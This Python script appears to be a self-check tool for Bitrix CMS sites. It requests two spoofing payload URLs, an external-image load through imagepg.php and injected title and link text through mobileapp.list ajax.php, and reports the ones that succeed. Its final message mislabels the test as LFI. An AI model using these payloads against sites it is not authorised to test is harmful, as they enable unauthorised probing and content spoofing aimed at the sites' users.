import requests

image = 'www.hd-tch.com/wp-content/uploads/2020/06/ما-هو-الـ-Spoofing-00000-768x403.png'
payloads = {f'bitrix/tools/imagepg.php?img=//{image}': image,
            'bitrix/components/bitrix/mobileapp.list/ajax.php?items[1][TITLE]'
            '=HELLO+WORLD!+PLEASE+CLICK+ME!&items[1][DETAIL_LINK]=http://ya.ru': "HELLO WORLD! PLEASE CLICK ME!"}


def check_vulnerability(url):
    r = requests.get(url)
    if r.status_code != 200:
        return "Произошла ошибка. Проверьте корректность введенного url"
    final = []
    for payload, responce in payloads.items():
        r = requests.get(f'{url}/{payload}')
        if r.status_code == 200 and responce in r.text:
            final.append(f'{url}/{payload} -- Найдена уязвимость SPOOFING !!!')

    if final:
        return '\n'.join(final)
    return 'Поздравляем, на вашем сайте не найден уязвимости LFI'


url_site = input('Введите url вашего сайта (например: "http://bitrix"): ')
print(check_vulnerability(url_site))
